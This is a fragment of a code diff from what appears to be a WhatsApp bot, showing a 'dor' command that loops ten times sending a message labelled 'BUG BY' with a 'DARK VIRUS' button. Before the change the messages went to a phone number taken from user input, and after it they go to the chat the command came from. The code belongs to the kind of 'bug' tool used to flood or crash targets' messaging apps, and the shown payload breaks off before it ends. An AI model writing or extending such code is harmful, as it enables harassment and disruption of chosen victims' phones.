@@ -3708,7 +3708,7 @@ case 'dor':
  let nomr = `${q}`+'@s.whatsapp.net'
        let jmlhny = '10'
 for (let i = 0; i < jmlhny; i++) {
-conn.sendMessage(nomr, {
+conn.sendMessage(from, {
 text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
 templateButtons: [
    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
